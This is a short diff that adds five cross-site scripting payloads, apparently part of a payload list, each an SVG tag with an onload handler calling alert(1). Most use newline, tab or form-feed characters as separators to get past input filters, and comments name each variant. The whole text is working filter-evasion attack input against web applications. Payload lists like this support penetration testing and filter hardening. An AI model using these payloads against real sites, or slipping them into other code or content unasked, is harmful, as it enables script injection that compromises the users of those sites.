@@ -1,0 +1,5 @@
+<svg/onload=alert(1)><svg>
+<svg
+onload=alert(1)><svg> # newline char
+<svg	onload=alert(1)><svg> # tab char
+<svgonload=alert(1)><svg> # new page char (0xc)
